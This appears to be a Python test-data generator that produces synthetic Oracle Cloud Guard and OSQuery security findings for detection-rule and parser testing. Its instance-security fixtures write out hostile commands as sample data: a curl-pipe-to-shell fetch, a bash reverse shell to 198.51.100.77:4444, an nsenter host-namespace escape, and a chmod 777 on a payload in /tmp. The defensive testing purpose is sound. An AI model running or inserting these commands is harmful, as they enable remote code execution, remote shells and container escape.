"""Auto-extracted from generate_test_logs.py — cloud guard synthetic events.

Behavior-preserving split: function bodies are unchanged. Shared constants and
helpers live in ``testlogs.common`` and are imported via star import.
"""
import json
import ntpath
import os
import random
import re
import sys
import uuid
from datetime import datetime, timedelta, timezone
from pathlib import Path

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from testlogs.common import *  # noqa: F401,F403


def cloud_guard_event(problem_type, resource_type="Instance", severity="HIGH",
                      recommendation="Review and remediate", offset=0):
    """Generate a Cloud Guard ProblemSummary-style event."""
    risk_score_map = {
        "CRITICAL": random.randint(90, 99),
        "HIGH": random.randint(70, 89),
        "MEDIUM": random.randint(40, 69),
        "LOW": random.randint(1, 39),
    }
    problem_id = str(uuid.uuid4())
    resource_name = f"test-{resource_type.lower()}-{random.randint(1, 99)}"
    return {
        # ProblemSummary-style identifiers
        "id": problem_id,
        "problemId": problem_id,  # backward compatibility for existing SOC parser content
        "compartmentId": COMPARTMENT_ID,
        "compartmentName": "security-test",
        "problemName": problem_type,
        "resourceType": resource_type,
        # Synthetic OCID: contract-required `ocid1.` prefix on the non-production
        # `demo` realm, so it satisfies the parser contract without ever matching
        # the real-OCID redaction gate (which keys on the `.oc1.` realm segment).
        "resourceId": f"ocid1.{resource_type.lower()}.demo.iad.{uuid.uuid4().hex[:8]}synthetic",
        "resourceName": resource_name,
        "riskLevel": severity,
        "riskScore": risk_score_map.get(severity.upper(), 50),
        "detectorId": "ACTIVITY_DETECTOR",
        "detectorRuleId": f"<DEMO_CLOUD_GUARD_DETECTOR_OCID_{uuid.uuid4().hex[:8]}>",
        "region": "us-phoenix-1",
        "timeFirstDetected": ts(offset),
        "timeLastDetected": ts(offset + 1),
        "lifecycleState": "ACTIVE",
        "lifecycleDetail": "OPEN",
        "labels": [problem_type, problem_type.replace("_", " ")],
        "recommendation": recommendation,
        "additionalDetails": {
            "recommendedAction": recommendation,
            "targetDetector": "Cloud Guard Detector",
        },
    }


def generate_cloud_guard_events():
    """Generate Cloud Guard events covering all 12 Cloud Guard rules."""
    events = []

    # Problem names must match the Sigma rule detection values exactly
    problems = [
        ("Bucket_Public_Read", "Bucket", "HIGH"),
        ("Bucket_Public_Write", "Bucket", "CRITICAL"),
        ("INSTANCE_PUBLIC_IP", "Instance", "HIGH"),
        ("Instance_Principals_Enabled", "Instance", "MEDIUM"),
        ("Policy_Too_Permissive", "Policy", "HIGH"),
        ("Group_Has_Too_Many_Admins", "Group", "HIGH"),
        ("IAM_User_API_Key_Old", "User", "MEDIUM"),
        ("IAM_User_Console_Password_Old", "User", "MEDIUM"),
        ("Audit_Log_Retention", "Tenancy", "MEDIUM"),
        ("VCN_Flow_Log_Disabled", "VCN", "MEDIUM"),
        ("VCN_Security_List_Port_SSH", "SecurityList", "HIGH"),
        ("VCN_Security_List_Port_RDP", "SecurityList", "HIGH"),
    ]

    for i, (problem, resource, severity) in enumerate(problems):
        for j in range(3):
            events.append(cloud_guard_event(problem, resource, severity, offset=i*5+j))

    return events


def generate_cloud_guard_instance_security_events():
    """Generate Cloud Guard Instance Security / OSQuery result-log findings."""
    base = BASE_TIME + timedelta(minutes=720)
    packs = [
        (
            "baseline-linux",
            "world_writable_paths",
            "World-writable directory in sensitive path",
            "SELECT path, mode FROM file WHERE path IN ('/tmp', '/var/tmp');",
            "World-writable path /tmp has unexpected executable payload",
            "high",
            "T1222",
            "File and Directory Permissions Modification",
            "/tmp/boopkit",
            "chmod 777 /tmp/boopkit",
        ),
        (
            "persistence",
            "suspicious_cron_entries",
            "Suspicious cron persistence",
            "SELECT command FROM crontab WHERE command LIKE '%curl%';",
            "Cron entry relaunches node diagnostic payload",
            "high",
            "T1053.003",
            "Cron",
            "/etc/cron.d/node-diag",
            "curl -fsS https://updates.example.test/node.sh | sh",
        ),
        (
            "network-exposure",
            "unexpected_listeners",
            "Unexpected listening process",
            "SELECT pid, port, protocol FROM listening_ports;",
            "Process bash opened listener on 0.0.0.0:4444",
            "critical",
            "T1095",
            "Non-Application Layer Protocol",
            "/proc/4444/exe",
            "bash -i >& /dev/tcp/198.51.100.77/4444 0>&1",
        ),
        (
            "container-oke-host",
            "host_namespace_processes",
            "Container process entered host namespace",
            "SELECT pid, cmdline FROM processes WHERE cmdline LIKE '%nsenter%';",
            "Privileged diagnostic pod entered host namespace",
            "critical",
            "T1611",
            "Escape to Host",
            "/usr/bin/nsenter",
            "nsenter -t 1 -m -u -i -n sh",
        ),
    ]
    events = []
    for index, (
        pack_name,
        query_id,
        finding_name,
        sql,
        finding,
        severity,
        technique_id,
        technique,
        file_path,
        command,
    ) in enumerate(packs, start=1):
        timestamp = (base + timedelta(minutes=index)).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"
        host = "oke-worker-01" if "container" in pack_name or query_id == "unexpected_listeners" else "app-prod-02"
        events.append({
            "timestamp": timestamp,
            "message": finding,
            "hostname": host,
            # Synthetic OCID: keeps the contract-required `ocid1.instance.` prefix
            # while using the non-production `demo` realm so it never matches the
            # real-OCID redaction gate (which keys on the `.oc1.` realm segment).
            "instanceOcid": f"ocid1.instance.demo.iad.cgis{index:02d}synthetic",
            "cloud.instance.id": f"ocid1.instance.demo.iad.cgis{index:02d}synthetic",
            "region": "us-ashburn-1",
            "riskLevel": severity.upper(),
            "severity": severity,
            "status": "open",
            "findingId": f"finding-cgis-{index:03d}",
            "findingName": finding_name,
            "problemId": f"cgis-problem-{index:03d}",
            "ruleId": f"cgis-rule-{query_id}",
            "pack": {
                "name": pack_name,
                "query_id": query_id,
                "query_name": finding_name,
            },
            "osquery": {
                "query": query_id,
                "sql": sql,
                "finding": finding,
                "result_count": 1,
            },
            "process": {
                "name": command.split()[0],
                "command_line": command,
            },
            "file": {"path": file_path},
            "source": {"ip": "198.51.100.42"},
            "destination": {"ip": "198.51.100.77", "port": 4444},
            "mitre": {
                "tactic": "Defense Evasion" if severity == "critical" else "Persistence",
                "technique_id": technique_id,
                "technique": technique,
            },
            "logType": "cloud_guard_instance_security",
        })
    return events
